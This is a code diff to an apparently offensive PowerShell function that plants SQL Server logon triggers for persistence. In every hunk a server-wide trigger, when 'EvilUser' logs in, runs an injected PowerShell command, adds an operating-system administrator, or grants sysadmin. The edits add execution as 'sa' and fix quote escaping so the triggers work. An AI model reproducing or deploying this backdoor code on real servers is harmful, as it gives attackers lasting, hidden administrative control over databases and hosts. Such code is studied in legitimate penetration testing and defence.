@@ -341,9 +341,9 @@ function Invoke-SqlServer-Persist-TriggerLogon
             DROP TRIGGER [evil_logon_trigger_pscmd] ON ALL SERVER
             exec('CREATE Trigger [evil_logon_trigger_pscmd] 
             on ALL Server
-            For LOGON
+            For LOGON WITH EXECUTE AS ''sa''
             AS
-            IF ORIGINAL_LOGIN() = 'EvilUser'
+            IF ORIGINAL_LOGIN() = ''EvilUser''
             $Query_PsCommand;
             END')"
 
@@ -385,10 +385,10 @@ function Invoke-SqlServer-Persist-TriggerLogon
             $Query = "IF EXISTS (SELECT * FROM sys.server_triggers WHERE name = 'evil_logon_trigger_addosadmin') 
             DROP TRIGGER [evil_logon_trigger_addosadmin] ON ALL SERVER
             exec('CREATE Trigger [evil_logon_trigger_addosadmin] 
-            on ALL Server
+            on ALL Server WITH EXECUTE AS ''sa''
             For LOGON
             AS
-            IF ORIGINAL_LOGIN() = 'EvilUser'
+            IF ORIGINAL_LOGIN() = ''EvilUser''
             $Query_OsAddUser;
             END')"
 
@@ -425,11 +425,11 @@ function Invoke-SqlServer-Persist-TriggerLogon
         $Query = "IF EXISTS (SELECT * FROM sys.server_triggers WHERE name = 'evil_logon_trigger_addsysadmin') 
         DROP TRIGGER [evil_logon_trigger_addsysadmin] ON ALL SERVER
         exec('CREATE Trigger [evil_logon_trigger_addsysadmin] 
-        on ALL Server
+        on ALL Server WITH EXECUTE AS ''sa''
         For LOGON
         AS
         BEGIN
-        IF ORIGINAL_LOGIN() = 'EvilUser'
+        IF ORIGINAL_LOGIN() = ''EvilUser''
         $Query_SysAdmin;
         END')"
 
